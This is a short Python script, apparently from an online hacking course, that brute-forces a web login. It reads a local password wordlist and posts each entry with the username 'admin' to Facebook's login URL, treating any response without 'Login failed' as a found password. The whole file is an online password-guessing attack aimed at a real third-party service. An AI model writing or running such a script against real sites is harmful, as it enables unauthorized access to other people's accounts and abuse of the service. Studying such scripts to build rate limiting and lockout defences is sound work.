#!/usr/bin/env python
import requests

target_url = "https://www.facebook.com/login"
data_dict = {"email":"admin", "password":" ", "Login":"submit"}

with open("/home/fraize/Desktop/Trainings/udemy/guess_login/passwords.txt" , "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of line.")
